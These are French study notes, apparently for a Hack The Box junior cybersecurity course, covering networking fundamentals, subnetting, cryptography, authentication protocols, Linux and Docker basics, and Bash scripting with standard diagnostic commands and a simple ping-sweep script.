# CJCA

## **Network Foundations**

# **Introduction aux Réseaux**

Un réseau est un ensemble de dispositifs interconnectés (appelés nœuds) capables d’échanger des données au travers de liens (médias filaires ou sans-fil).

Les réseaux permettent le partage de ressources, la communication et l’accès distant aux données.

## Concepts essentiels

| Concept | Description |
| --- | --- |
| Nœud (Node) | Appareil connecté au réseau |
| Lien (Link) | Chemin de communication, filaire ou sans-fil |
| Partage de données | Objectif principal : échanger et distribuer de l’information |

## Types de réseaux

| Type | Description |
| --- | --- |
| LAN | Réseau local, rapide, couvrant une zone réduite (maison, entreprise) |
| WAN | Réseau étendu, reliant de multiples LAN à l’échelle nationale ou mondiale |

# **Modèles OSI et TCP/IP**

## Modèle OSI (7 couches)

| Couche | Fonction principale | Exemples |
| --- | --- | --- |
| 1 – Physique | Transmission électrique/optique des bits | RJ45, fibre |
| 2 – Liaison | MAC, trames, commutation | Switch, ARP |
| 3 – Réseau | Routage, IP | Routeur, IP |
| 4 – Transport | TCP/UDP, ports, fiabilité | `netstat`, `ss` |
| 5 – Session | Gestion de sessions | API |
| 6 – Présentation | Format, chiffrement | TLS/SSL |
| 7 – Application | Protocoles applicatifs | HTTP, DNS |

### Commandes associées

```bash
ip link
ip addr
arp -a
ss -tulnp
curl http://example.com

```

## Modèle TCP/IP (4 couches)

| Couche | Correspondance OSI | Exemples |
| --- | --- | --- |
| Link | 1 + 2 | Ethernet, Wi-Fi |
| Internet | 3 | IP, ICMP |
| Transport | 4 | TCP, UDP |
| Application | 5-7 | HTTP, DNS, FTP |

# **Composants d’un Réseau**

## Équipements terminaux (End Devices)

Dispositifs générant ou recevant des données : ordinateurs, smartphones, IoT, serveurs.

Commandes utiles :

```bash
ip addr
getmac
ipconfig /all

```

## Switches (couche 2)

Acheminent les trames selon les adresses MAC.

Afficher la table MAC :

```bash
sudo bridge fdb show

```

## Routeurs (couche 3)

Déterminent le chemin des paquets IP.

Commandes :

```bash
ip route
traceroute 8.8.8.8

```

# **Communication Réseau : MAC, IP, Ports**

## Adresse MAC (couche 2)

Identifiant matériel unique de 48 bits.

```bash
ip link

```

## Adresse IP (couche 3)

Permet l’identification logique d’un hôte.

IPv4 : `192.168.1.10`

IPv6 : `2001:db8::1`

```bash
ip addr

```

## Ports (couche 4)

| Service | Port | Protocole |
| --- | --- | --- |
| HTTP | 80 | TCP |
| HTTPS | 443 | TCP |
| DNS | 53 | UDP/TCP |
| SSH | 22 | TCP |

Lister les ports ouverts :

```bash
ss -tulnp

```

## ARP : résolution IP → MAC

```bash
arp -a
ping 192.168.1.1
arp -a

```

# **DHCP – Attribution Dynamique d’Adresses**

Le processus  :

1. Discover
2. Offer
3. Request
4. Acknowledge

Renouveler un bail DHCP :

```bash
sudo dhclient -r
sudo dhclient

```

Fichiers et paramètres associés :

```bash
ip route
cat /etc/resolv.conf

```

# **NAT – Network Address Translation**

Permet à plusieurs machines internes d’utiliser une seule adresse IP publique.

Types de NAT :

- PAT (NAT overload, le plus courant)
- NAT statique
- NAT dynamique

Vérifier son IP publique :

```bash
curl ifconfig.me

```

# **DNS – Résolution Noms → IP**

### Processus de résolution DNS

1. Recherche dans le cache local
2. DNS récursif
3. Root servers
4. TLD (.com)
5. Serveur autoritaire

Commandes essentielles :

```bash
nslookup example.com
dig example.com
cat /etc/resolv.conf

```

# **Réseaux Sans-Fil**

Technologies :

- 2.4 GHz : grande portée, plus d’interférences
- 5 GHz : haute performance, courte portée
- Hotspot : partage de connexion mobile
- Cell tower : couverture 4G/5G

Commandes utiles :

```bash
sudo iwlist wlan0 scan
iwconfig

```

# **Sécurité Réseau (Firewall, IDS/IPS)**

## Pare-feu (Firewall)

### iptables (Linux)

```bash
sudo iptables -L -v
sudo iptables -A INPUT -p icmp -j DROP

```

### Windows

```powershell
netsh advfirewall firewall show rule name=all

```

Types de pare-feu :

- Packet filtering (couches 3-4)
- Stateful firewall
- Application firewall (L7)
- NGFW (Deep Packet Inspection)

## IDS / IPS

Lancer Suricata :

```bash
sudo suricata -c /etc/suricata/suricata.yaml -i eth0

```

Voir les alertes :

```bash
cat /var/log/suricata/fast.log

```

Méthodes de détection :

- Analyse par signatures
- Analyse comportementale (anomalies)

# **Parcours Complet d’un Paquet (Accès à un Site Web)**

## Étapes techniques

| Étape | Description | Commande associée |
| --- | --- | --- |
| 1 | Connexion Wi-Fi | `iwconfig` |
| 2 | Attribution IP via DHCP | `dhclient`, `ip addr` |
| 3 | Résolution DNS | `nslookup`, `dig` |
| 4 | Construction du paquet TCP/IP | `ss -t` |
| 5 | NAT sur le routeur | `curl ifconfig.me` |
| 6 | Routage internet | `traceroute` |
| 7 | Réception, décapsulation et affichage | wireshark, tcpdump |

# **Commandes d’Analyse Réseau**

### Sniffer ARP

```bash
sudo tcpdump -nn -i eth0 arp

```

### Sniffer HTTP

```bash
sudo tcpdump -nn -i eth0 port 80

```

### Capture complète en .pcap

```bash
sudo tcpdump -i wlan0 -w capture.pcap

```

## **Introduction to Networking**

![image.png](image.png)

## Vue d’ensemble & segmentation réseau

- Un réseau = des machines qui communiquent via des **médias** (cuivre, fibre, Wi-Fi…) et des **protocoles** (TCP, UDP…).
- Un **réseau plat /24** (tout le monde dans le même LAN) est simple mais dangereux :
    - difficile de filtrer finement,
    - facile pour un attaquant de se déplacer latéralement sans être vu.
- Segmentation = créer **plusieurs petits réseaux** avec des ACL, pare-feux, VLAN… → ajoute des **couches de défense**.
- Analogie de la maison :
    - clôture ≈ ACL entre réseaux,
    - éclairage ≈ supervision / logs,
    - buissons ≈ IDS/IPS qui découragent les scans.

### Erreur classique du pentester

- Le pentester met par habitude un **/24** alors que le réseau est en **/25** des deux côtés.
- Résultat : il reste coincé sur le réseau « clients » et ne voit jamais le réseau « serveurs / DC » pourtant accessible.
- Message clé : **toujours vérifier le masque + la table de routage**, pas se fier aux habitudes.

## Structure « Home / Company network »

- Internet = un ensemble de **réseaux subdivisés** (ex : réseau maison, réseau entreprise) reliés par des **routeurs** et l’**ISP**.
- L’accès à un site web :
    - on tape un **FQDN / URL**,
    - le routeur → FAI,
    - FAI → **DNS** pour traduire le nom en IP,
    - le paquet va vers le **webserver** de l’entreprise,
    - la réponse revient via les routeurs jusqu’à notre IP source.

### Bonus sécurité sur le schéma d’entreprise

Idéalement, l’entreprise aurait **au moins 5 réseaux séparés** :

1. **DMZ** pour le webserver (exposé Internet).
2. **Réseau postes clients** séparé des serveurs et des autres postes.
3. **Réseau d’administration** pour routeurs / switches.
4. **Réseau VoIP** pour les téléphones IP (latence + confidentialité).
5. **Réseau imprimantes** (très difficile à sécuriser, vecteur d’attaque et de persistance).

### Histoire de l’imprimante piégée

- Pentest physique pendant le COVID : l’attaquant envoie une **imprimante backdoorée**.
- La boîte la branche sur le LAN → la machine fait un **reverse shell** vers l’attaquant et récupère les **identifiants du domain admin**.
- Si le réseau avait été correctement segmenté (imprimante isolée, pas d’accès Internet, pas de port 445 vers les postes, etc.), l’attaque aurait été beaucoup plus compliquée voire impossible.

## Types de réseaux

**Termes courants :**

- **WAN** : ensemble de LAN (Internet ou WAN interne).
- **LAN** : réseau local (maison, bureau), souvent en IP privées RFC1918.
- **WLAN** : même chose en Wi-Fi.
- **VPN** : fait comme si on était branché sur un autre réseau.

**Types de VPN :**

- **Site-to-Site** : relie deux sites (routeurs/firewalls) en partageant des plages réseau.
- **Remote Access VPN** : un client crée une interface virtuelle (ex : OpenVPN de HTB → interface `tun0`).
    - **Split tunneling** : seules certaines routes passent dans le VPN (ex : 10.10.10.0/24), le reste sort par Internet normal.
- **SSL VPN** : dans le navigateur (RDP/Apps streamées).

**Termes « de livre » à connaître mais moins utilisés :**

- **GAN** (global), **MAN** (ville / métropole), **PAN/WPAN** (Bluetooth, IoT court-portée).

## Topologies réseau

- **Physique** = comment c’est câblé/branché ;
    
    **Logique** = comment les données circulent réellement.
    

Types principaux :

- **Point-to-Point** : lien direct entre deux hôtes.
- **Bus** : tous sur le même média partagé.
- **Étoile** : tous connectés à un point central (switch/routeur).
- **Anneau** : chaque hôte a un voisin avant/après, circulation dans un sens, peut utiliser un **token**.
- **Mesh** (maillé) :
    - **full mesh** : tous les nœuds reliés entre eux (fiabilité, surtout WAN),
    - **partial mesh** : seulement certains nœuds sont très connectés.
- **Arbre** : extension d’étoile, très proche de ce qu’on trouve dans les gros LAN (hiérarchie de switches).
- **Hybride** : combinaison de plusieurs topo.
- **Daisy chain** : hôtes en chaîne.

## Proxies

- **Proxy = médiateur de couche 7** qui voit et traite le contenu (sinon c’est juste une passerelle/gateway).
- Types principaux :
    1. **Forward proxy** (proxy de sortie) : le client parle au proxy, qui parle à Internet pour lui.
        - Ex : proxy web d’entreprise, Burp en mode classique.
    2. **Reverse proxy** (proxy d’entrée) : reçoit les requêtes pour un service interne et les relaie.
        - Ex : Cloudflare, ModSecurity (WAF), reverse proxy sur machine compromise pour rebondir.
    3. **(Non-)transparent** :
        - transparent = le client ne sait pas qu’il parle à un proxy,
        - non-transparent = le client est configuré pour l’utiliser (proxy du navigateur, etc.).

## Modèles OSI et TCP/IP + encapsulation

- Deux modèles :
    - **OSI** : 7 couches (Physique → Application).
    - **TCP/IP** : 4 couches (Link, Internet, Transport, Application).
- Les couches supérieures (appli) utilisent les services des couches inférieures (transport, réseau, lien, physique).

**PDU par couche (OSI) :**

- L1 : **bit**
- L2 : **trame**
- L3 : **paquet**
- L4 : **segment/datagramme**
- L5-7 : **données**

**Encapsulation :**

- À l’envoi : Data appli → segment TCP/UDP → paquet IP → trame Ethernet → bits.
- À la réception : décapsulation dans l’ordre inverse.

![6633572b-c841-4281-8dab-73474965f773.png](6633572b-c841-4281-8dab-73474965f773.png)

## Couches OSI (détail)

- **1 Physique** : signaux électriques / optiques / radio, câbles, Wi-Fi.
- **2 Liaison** : trames, détection d’erreurs, MAC, VLAN.
- **3 Réseau** : adressage logique, routage, IP, ICMP, OSPF, etc.
- **4 Transport** : fiabilité, segmentation, contrôle de flux (**TCP**, **UDP**).
- **5 Session** : ouverture/gestion de sessions logiques.
- **6 Présentation** : format des données, chiffrement, compression.
- **7 Application** : interfaces au logiciel (HTTP, FTP, SMTP…).

## Modèle TCP/IP (détail)

- **Link** : accès au média (Ethernet, Wi-Fi…).
- **Internet** : adressage + routage (IP, ICMP, etc.).
- **Transport** : TCP (connexion, fiabilité) & UDP (datagrammes).
- **Application** : protocoles de niveau appli (HTTP, DNS, SSH, etc.).

Tâches importantes :

- **Adressage logique & routage** : IP.
- **Contrôle d’erreur / flux & ports** : TCP/UDP.
- **Résolution de noms** : DNS.

## IPv4, masque, binaire, CIDR & subnetting

### IPv4

- Adresse **32 bits**, 4 octets de 0 à 255 (`x.x.x.x`).
- Composée d’une **partie réseau** et d’une **partie hôte**.
- Anciennes **classes A/B/C** historiques, remplacées par **CIDR**.

### Masque et CIDR

- Masque = suite de bits à 1 (réseau) puis à 0 (hôte).
- Notation **CIDR** : `IP/prefix` (ex : `192.168.10.39/24`).
- Le /n indique le **nombre de bits de réseau**.

### Binaire

- Chaque octet = 8 bits, poids 128-64-32-16-8-4-2-1.
- Conversion décimal ↔ binaire pour comprendre comment le masque découpe l’adresse.

### Subnetting

- But : découper un bloc en **plus petits sous-réseaux**.
- À partir de `IP` + `masque` on détermine :
    - adresse de réseau,
    - broadcast,
    - premier / dernier hôte,
    - nombre d’hôtes utilisables.
- Méthode :
    - bits à 0 dans la partie hôte → plage possible,
    - tout à 0 = **network**, tout à 1 = **broadcast**.
        
        ![ac97acaf-e20c-4733-ae2a-e2a495966b4c.png](ac97acaf-e20c-4733-ae2a-e2a495966b4c.png)
        

### Mental subnetting

- D’abord, repérer **quel octet varie** (/8, /16, /24, /32).
- Puis, utiliser le **reste de la division par 8** pour trouver la taille du bloc (2^(8–reste)).
    - ex : `/25` → 25 % 8 = 1 → taille bloc = 2^(8–1)=128.
- Les plages se répètent de `0, +128, +128, …` dans l’octet concerné.
- Toujours se souvenir : 0 = network, dernière adresse = broadcast, le reste = hôtes.

## MAC & ARP

![what-is-arp.jpg](what-is-arp.jpg)

### MAC

- MAC = **adresse physique** de 48 bits / 6 octets, en hex (`DE:AD:BE:EF:13:37`).
- Deux parties :
    - **OUI** (3 premiers octets) = constructeur,
    - **NIC** (3 derniers) = identifiant interface.
- Certains bits indiquent :
    - unicast / multicast,
    - globale / locale (admin).

### ARP

- Sert à faire la **correspondance IP ↔ MAC** sur un LAN.
- **ARP Request** (broadcast) « Who has IP X ? tell IP Y ».
- **ARP Reply** (unicast) « IP X is at MAC Z ».
- Cache ARP sur chaque machine.

### Vecteurs d’attaque

- **MAC spoofing** : changer son MAC pour bypasser un filtrage.
- **MAC flooding** : saturer la CAM table d’un switch.
- **ARP spoofing / poisoning** : empoisonner le cache ARP d’une victime pour devenir **MITM** entre victime et gateway.

## IPv6 (idées clés)

- Adresse **128 bits** en hex, 8 blocs séparés par `:` (ex : `fe80::dd80:b1a9:6687:2d3b/64`).
- Beaucoup d’adresses → plus besoin de NAT.
- Plusieurs IPv6 possibles par interface.
- Types d’adresses : **unicast**, **anycast**, **multicast** (pas de broadcast).
- Utilise fortement le **hex** ; règles de simplification (`::`, suppression des zéros en tête).

## Terminologie/protocoles à connaître

- Famille de protocoles réseau, sécurité, routage, authent, etc.
    
    Exemples importants pour un red-teamer / admin :
    
    - **SSH, FTP, SMTP, HTTP, SMB, NFS, SNMP, NTP**
    - **VLAN, VTP, STP, RIP, OSPF, EIGRP**
    - **HSRP, VRRP** (redondance routeur)
    - **SIP, VoIP**
    - **VPN, IPsec, PPTP, GRE**
    - **NAT**
    - **TLS/SSL, PGP, PEAP/EAP**
- L’idée principale : avoir un **vocabulaire de base** pour comprendre la doc, les configs et les rapports d’audit.

## Diffie–Hellman & ECDH

- **Diffie–Hellman (DH)** :
    - Chaque partie génère un secret privé, échange une valeur publique, puis calcule le même secret partagé via des opérations mathématiques (arithmétique modulaire).
    - Avantage : pas besoin de clé partagée à l’avance.
    - Limite : **vulnérable au Man-in-the-Middle** si l’échange n’est pas authentifié (ex : pas de certificat, pas de signature).
- **ECDH (Elliptic Curve Diffie–Hellman)** :
    - Même principe mais sur les **courbes elliptiques**.
    - À sécurité égale, les clés sont plus petites et les calculs plus rapides → idéal pour mobiles, VPN, TLS modernes.

> En pratique, dans TLS (HTTPS, SMTPS, etc.), on trouve souvent des suites de chiffrement du type ECDHE-RSA-AES256-GCM-SHA384 : ECDHE pour l’échange de clé éphémère, RSA pour la signature du serveur, AES-GCM pour le chiffrement.
> 

### Petit test pratique

Afficher la suite de chiffrement et le type d’échange de clé utilisé par un site :

```bash
openssl s_client -connect www.example.com:443 -tls1_2 </dev/null 2>/dev/null \
  | grep -E 'Cipher|Protocol'

```

Tu verras souvent `ECDHE` dans le nom de la suite.

## RSA & ECDSA

- **RSA** : basé sur la difficulté de factoriser un grand nombre composite.
    - Utilisé pour : chiffrement, **signature**, échange de clés (dans les anciens TLS « RSA key exchange »), certificats X.509, PKI…
    - Plus les clés sont grandes, plus c’est lourd côté CPU (et lent sur du vieux matos).
- **ECDSA** : version elliptique de DSA.
    - Sert uniquement pour la **signature** (authentification et intégrité).
    - Plus efficace qu’RSA à niveau de sécurité comparable → très utilisé pour certificats serveurs modernes, SSH, etc.

### Commandes utiles

Générer une paire de clés pour tes labs :

```bash
# Clé RSA 4096 bits
ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa_lab

# Clé elliptique moderne
ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519_lab

```

## IKE & PSK (VPN)

**IKE (Internet Key Exchange)** est la brique qui permet à IPsec de négocier les paramètres de chiffrement dans un VPN :

- Utilise **Diffie–Hellman (ou ECDH)** pour fabriquer le secret partagé.
- Peut combiner **certificats (RSA/ECDSA)** ou **Pre-Shared Key (PSK)** pour authentifier les deux extrémités.

Deux modes principaux :

- **Main mode** : plus de messages, meilleure confidentialité de l’identité.
- **Aggressive mode** : moins de messages → plus rapide, mais identités exposées plus tôt, donc moins sécurisé.

**PSK** : mot de passe partagé entre les deux gateways / clients.

Avantage : simple à déployer.

Inconvénients : difficile à distribuer en sécurité ; si le PSK fuit, tout le VPN est compromis (d’où l’intérêt des certificats).

# Protocoles d’authentification

Les protocoles d’authentification servent à **prouver qui tu es** avant d’autoriser l’accès à un service.

## Exemples importants

- **Kerberos** : tickets délivrés par un **KDC** dans les domaines AD.
- **SSL/TLS** : authentifie le serveur (certificat) et parfois le client (mutual TLS).
- **OAuth / OpenID / SAML / SSO** : délèguent l’authentification à un fournisseur d’identité (IdP).
- **PAP / CHAP / EAP / PEAP / LEAP** : utilisés surtout pour accès réseau (PPP, VPN, Wi-Fi 802.1X).
    - LEAP est obsolète et vulnérable.
    - **PEAP + MSCHAPv2 ou EAP-TLS** sont beaucoup plus robustes.
- **2FA / MFA** : ajout d’un second facteur (TOTP, SMS, clé physique, biométrie).

Ce qui compte pour nous en sécu :

- Préférer des schémas **mutuellement authentifiés** (certificats, Kerberos, EAP-TLS) plutôt qu’un simple mot de passe.
- Éviter PAP et LEAP en production → privilégier EAP-TLS, PEAP, SSH avec clés, etc.

### Mini-lab rapide

Sur un site HTTPS, vérifier le certificat et le protocole :

```bash
echo | openssl s_client -connect target.lab:443 2>/dev/null \
  | openssl x509 -noout -subject -issuer -dates

```

# Connexions TCP/UDP et analyse réseau

## TCP vs UDP

- **TCP** :
    - connexion orientée (3-way handshake SYN/SYN-ACK/ACK),
    - fiable (retransmissions, numéros de séquence, ACK, fenêtre, contrôle de flux),
    - utilisé pour HTTP(S), SSH, SMTP, etc.
- **UDP** :
    - pas de connexion logique, pas d’ACK, pas de retransmission,
    - utile quand la **vitesse** est prioritaire à la fiabilité : VoIP, DNS, streaming, jeux en ligne, etc.

### Observer une poignée de main TCP

```bash
# Sur ton interface VPN HTB par exemple
sudo tcpdump -n -i tun0 'tcp[tcpflags] & (tcp-syn|tcp-ack) != 0'

```

Tu verras les SYN / SYN-ACK / ACK défiler.

## IP header, TTL, ID & traçage

- L’**en-tête IP** contient, entre autres :
    - `TTL` : nombre de sauts restants (utilisé par `traceroute`).
    - `ID` : identifiant de fragment ; sur certaines stacks, il permet de voir que plusieurs IP appartiennent au **même host** (IP ID qui s’incrémente de façon continue).
    - `Protocol` : 6 (TCP), 17 (UDP), 1 (ICMP)…

### Exemples pratiques

Tracer un chemin (TTL + ICMP) :

```bash
traceroute -T -p 80 10.10.10.10      # traceroute TCP
# ou
traceroute 10.10.10.10              # UDP (Unix)

```

Utiliser l’option **Record-Route** de `ping` (quand autorisée) :

```bash
ping -c 1 -R 10.129.x.y

```

On obtient les IP intermédiaires vues par le paquet (option IP `RR`).

## Blind spoofing (idée)

Le **blind spoofing** consiste à forger des paquets IP/TCP avec une **fausse IP source** et des numéros de séquence devinés, **sans voir les réponses**.

Aujourd’hui, ça reste surtout théorique sur Internet à cause :

- des filtres anti-spoofing (BCP 38),
- des pare-feux stateful,
- des numéros de séquence TCP randomisés.

Mais en environnement de lab, ça permet de comprendre la dépendance des connexions TCP aux numéros de séquence et à l’IP source.

# Cryptographie côté réseau

## Symétrique vs asymétrique

- **Chiffrement symétrique** : même clé pour chiffrer/déchiffrer.
    - Rapide, idéal pour gros volumes de données.
    - Ex : **AES**, anciennement **DES / 3DES** (obsolètes).
- **Chiffrement asymétrique** : paire **clé publique / clé privée**.
    - Sert à chiffrer de petites données, échanger une clé symétrique, signer.
    - Ex : **RSA**, **ECC** (ECDH, ECDSA), PGP.

Schéma typique d’une session TLS :

1. Négociation → échange de clé (ECDHE).
2. Le secret partagé sert à dériver des clés **AES-GCM** pour chiffrer le flux.
3. RSA/ECDSA ne chiffre pas tout le trafic, il sert à **authentifier** le serveur (signature du certificat).

### Petit test AES en ligne de commande

```bash
# Chiffrer
openssl enc -aes-256-cbc -pbkdf2 -salt \
  -in secret.txt -out secret.txt.enc

# Déchiffrer
openssl enc -d -aes-256-cbc -pbkdf2 \
  -in secret.txt.enc -out secret_decrypted.txt

```

## DES, 3DES et AES

- **DES** : 56 bits de clé → aujourd’hui **cassable** par brute force.
- **3DES** : appliqué 3 fois → plus robuste mais lent, et considéré comme **legacy**.
- **AES (128/192/256)** : standard moderne, utilisé dans :
    - Wi-Fi WPA2/WPA3,
    - IPsec,
    - SSH, TLS,
    - chiffrage disque (BitLocker, LUKS).

## Modes de chiffrement

AES est un **bloc** de 128 bits ; les **modes** définissent comment on chiffre plusieurs blocs :

- **ECB** : mêmes blocs → mêmes chiffrés, fuit les patterns → à éviter.
- **CBC** : chaque bloc dépend du précédent (utilisé dans anciens TLS).
- **CFB / OFB / CTR** : transforment un bloc en chiffrement de flux.
- **GCM** : mode compteur + authentification intégrée (confidentialité + intégrité).
    - Très utilisé dans TLS modernes (`AES-GCM`), IPsec, VPN.

## **Linux Fundamentals**

## Web Recon avec `curl`

```bash
# Récupérer code source et extraire les chemins uniques
curl -s https://www.inlanefreight.com \
| grep -oP '(?<=href=")https://www.inlanefreight.com[^"]+' \
| sed 's#https://www.inlanefreight.com##' \
| cut -d'?' -f1 | sort -u

# Compter le nombre de chemins
curl -s https://www.inlanefreight.com \
| grep -oP '(?<=href=")https://www.inlanefreight.com[^"]+' \
| sed 's#https://www.inlanefreight.com##' \
| cut -d'?' -f1 | sort -u | wc -l

```

## Lancer un serveur local

### Avec **PHP**

```bash
php -S 127.0.0.1:8080

```

### Avec **NPM (http-server)**

```bash
npx http-server -p 8080

```

## Docker (Pwnbox / Linux Fundamentals)

### Vérifier et lancer Docker

```bash
sudo systemctl start docker
sudo systemctl status docker

```

### Test de Docker

```bash
sudo docker run hello-world

```

### Construire une image (depuis Dockerfile)

```bash
sudo docker build -t fs_docker .

```

### Lancer un conteneur (Apache + SSH)

```bash
sudo docker run -p 8022:22 -p 8080:80 -d fs_docker

```

### Gestion des conteneurs

```bash
sudo docker ps         # Voir conteneurs actifs
sudo docker stop <id>  # Stopper
sudo docker start <id> # Relancer
sudo docker logs <id>  # Voir logs

```

## Autres utiles HTB

### Vérifier un service systemd

```bash
systemctl show dconf.service | grep Type=
systemctl status dconf.service

```

## **Introduction to Bash Scripting**

## Pourquoi Bash est important en pentest

Bash (**Bourne Again Shell**) est le shell et langage de script standard sur la plupart des systèmes Unix/Linux.

En pentest / privesc, il sert à :

- **Automatiser** les tâches répétitives (scan, parsing de logs, traitement de wordlists…).
- **Filtrer / transformer** rapidement de gros volumes de données (pipelines avec `grep`, `awk`, `cut`, etc.).
- **Chaîner des commandes** et exploiter leurs sorties pour gagner du temps (au lieu de tout faire à la main).

Un script Bash n’a pas besoin de compilation : il est interprété directement par le shell (`/bin/bash`).

Exécution typique :

```bash
bash script.sh <args>      # explicite
sh script.sh <args>        # autre interpréteur (sh)
./script.sh <args>         # si exécutable + shebang correct

```

## Structure d’un script Bash (exemple : CIDR.sh)

Le script **CIDR.sh** est un bon exemple “réel” :

1. **Vérification des arguments**
2. **Fonction** pour récupérer le NetRange / CIDR via `whois`
3. **Fonction** pour ping toutes les IP du range
4. **Résolution DNS** du domaine pour obtenir les IP
5. **Menu interactif** avec `read` + `case` pour choisir l’action

```bash
#!/bin/bash          # Shebang : interpréteur utilisé

if [ $# -eq 0 ]; then
  echo -e "You need to specify the target domain.\n"
  echo -e "Usage:"
  echo -e "\t$0 <domain>"
  exit 1
else
  domain=$1
fi

```

Ce bloc montre déjà plusieurs briques :

- **Shebang** (`#!/bin/bash`) : indique quel interpréteur exécute le script.
- **Condition if/else** pour vérifier le nombre d’arguments.
- **Variables spéciales** :
    - `$#` : nombre d’arguments
    - `$0` : nom du script
    - `$1` : premier argument (ici le domaine)
- **Variable classique** : `domain=$1`.

## Arguments, variables et tableaux

### Arguments & variables spéciales

Bash fournit des variables pré-définies pour les arguments :

- `$0` : nom du script
- `$1` à `$9` : 1er, 2e… 9e argument
- `$#` : nombre d’arguments
- `$@` : liste de tous les arguments
- `$?` : code de retour de la dernière commande
- `$$` : PID du shell courant

Exemple simple :

```bash
./script.sh ARG1 ARG2 ARG3
# -> $0 = ./script.sh, $1 = ARG1, $2 = ARG2, $3 = ARG3

```

Déclaration de variable :

```bash
variable="valeur"
echo "$variable"

```

> Important : pas d’espace autour du = ; sinon Bash interprète ça comme une commande.
> 

### Tableaux

Les tableaux permettent de stocker plusieurs valeurs dans une seule variable :

```bash
domains=(www.inlanefreight.com ftp.inlanefreight.com vpn.inlanefreight.com)

echo "${domains[0]}"    # www.inlanefreight.com

```

Les guillemets permettent de grouper plusieurs valeurs dans un seul élément :

```bash
domains=("www.inlanefreight.com ftp.inlanefreight.com vpn.inlanefreight.com" www2.inlanefreight.com)

echo "${domains[0]}"    # les trois premiers domaines en une seule chaîne
echo "${domains[1]}"    # www2.inlanefreight.com

```

## Exécution conditionnelle & opérateurs de comparaison

### If / elif / else

Les blocs `if` permettent d’exécuter certaines commandes seulement si la condition est vraie :

```bash
if [ "$value" -gt 10 ]; then
  echo "Greater than 10"
elif [ "$value" -lt 10 ]; then
  echo "Less than 10"
else
  echo "Equal or not a number"
fi

```

Tu peux chaîner :

- **`if` seul**
- **`if … elif … else … fi`** pour plusieurs cas

### Types d’opérateurs

- **Integer (`[ ]`)**
    - `eq` (égal), `ne` (≠), `lt` (<), `le` (≤), `gt` (>), `ge` (≥)
- **String**
    - `==`, `!=`, `z` (chaîne vide), `n` (non vide)
    - `<` / `>` pour ordre ASCII, seulement dans `[[ … ]]`
- **Fichiers**
    - `e` existe, `f` fichier, `d` dossier, `r` lisible, `w` écrivable, `x` exécutable, etc.
- **Logique**
    - `!` (NOT), `&&` (AND), `||` (OR)

Exemple de test de fichier :

```bash
if [[ -e "$1" && -r "$1" ]]; then
  echo "Readable file"
else
  echo "Not readable or does not exist"
fi

```

## Arithmétique & longueur de variables

Bash sait faire de l’arithmétique simple :

```bash
echo $((10 + 10))   # 20
((counter++))       # incrément
((counter--))       # décrément

```

Longueur d’une variable (très utile pour certains exercices HTB) :

```bash
var="HackTheBox"
echo ${#var}        # 10

```

## Entrées / sorties : `read`, redirections et `tee`

### Input utilisateur

`read` permet de demander une saisie interactive :

```bash
read -p "Select your option: " opt

```

Dans **CIDR.sh**, cette valeur est ensuite utilisée dans un `case` pour choisir une action :

```bash
case $opt in
  "1") network_range ;;
  "2") ping_host ;;
  "3") network_range && ping_host ;;
  "*") exit 0 ;;
esac

```

### Redirections & `tee`

Plutôt que de rediriger la sortie vers un fichier **ou** vers l’écran, `tee` fait les deux :

```bash
whois "$ip" | grep "CIDR" | tee -a CIDR.txt

```

- Tu vois le résultat en live dans le terminal
- Il est enregistré en même temps dans le fichier (avec `a` pour *append*)

## Boucles : for / while / until

### `for`

Très utile pour boucler sur :

- une liste de valeurs
- un tableau
- une plage (`{1..40}`)

```bash
for ip in 10.10.10.170 10.10.10.174; do
  ping -c 1 "$ip"
done

```

Dans **CIDR.sh**, `for` sert à :

- parcourir la liste d’IP pour faire les `whois`
- parcourir le range CIDR pour ping toutes les IP

### `while`

S’exécute **tant que** la condition est vraie :

```bash
counter=0
while [ "$counter" -lt 10 ]; do
  ((counter++))
  echo "Counter: $counter"
done

```

Dans **CIDR.sh**, le `while` est utilisé comme “mini boucle une seule fois” contrôlée par `stat` :

```bash
stat=1
while [ $stat -eq 1 ]; do
  ping -c 2 "$host" > /dev/null 2>&1
  if [ $? -eq 0 ]; then
    echo "$host is up."
    ((hosts_up++))
  else
    echo "$host is down."
  fi
  ((hosts_total++))
  ((stat--))       # permet de sortir de la boucle
done

```

### `until`

Même principe que `while`, mais l’inverse :

- `while` → boucle tant que la condition est **vraie**
- `until` → boucle tant que la condition est **fausse**

```bash
counter=0
until [ "$counter" -eq 10 ]; do
  ((counter++))
  echo "Counter: $counter"
done

```

## Branches : `case` (switch–case)

Alternative à `if/elif/else` quand tu compares une variable à des valeurs fixes :

```bash
case $opt in
  "1") echo "Option 1" ;;
  "2") echo "Option 2" ;;
  *)   echo "Default"  ;;
esac

```

Dans **CIDR.sh**, c’est utilisé pour proposer un **menu** interactif :

- `1` → lancer `network_range`
- `2` → lancer `ping_host`
- `3` → les deux
- autre → quitter

## Fonctions & codes de retour

### Fonctions

Deux syntaxes équivalentes :

```bash
function name {
  commands
}

name() {
  commands
}

```

Tu peux :

- factoriser du code réutilisé plusieurs fois
- améliorer la lisibilité
- passer des paramètres comme pour un script (`$1`, `$2`, …)

Exemple :

```bash
function print_pars {
  echo "$1" "$2" "$3"
}

print_pars "First" "Second" "Third"

```

Dans **CIDR.sh**, on retrouve :

- `function network_range { … }`
- `function ping_host { … }`

### Codes de retour & `$?`

Chaque fonction ou commande retourne un **exit code** :

- `0` → succès
- non-0 → erreur de différents types

Exemple :

```bash
myfunc() {
  if [ $# -lt 1 ]; then
    return 1
  else
    return 0
  fi
}

myfunc
echo $?     # affiche 1

myfunc "arg"
echo $?     # affiche 0

```

Tu peux aussi récupérer la **sortie** d’une fonction dans une variable :

```bash
result=$(myfunc "arg")

```

## Debugging Bash

Bash fournit deux options très pratiques pour **débugger** :

- `x` : montre chaque commande exécutée, arguments inclus
- `v` : affiche le code source lu, puis ce qui est exécuté

Exemples :

```bash
bash -x script.sh          # trace d’exécution
bash -x -v script.sh       # trace + code

```

On voit alors ligne par ligne :

- les conditions évaluées
- les valeurs des variables
- où le script sort / plante

## Ce que j’ai retenu pour la pratique (pentest / admin)

- Bash permet de **prototyper très vite** des petits outils (comme `CIDR.sh`) pour :
    - résoudre un domaine → IP,
    - extraire le NetRange,
    - ping un range complet,
    - logguer les résultats automatiquement.
- Les briques de base que je dois maîtriser par cœur :
    - **Arguments & variables spéciales** : `$#`, `$0`, `$1`, `$?`
    - **Tests** : `if`, `[[ … ]]`, opérateurs `eq`, `gt`, `e`, `r`, `&&`, `||`
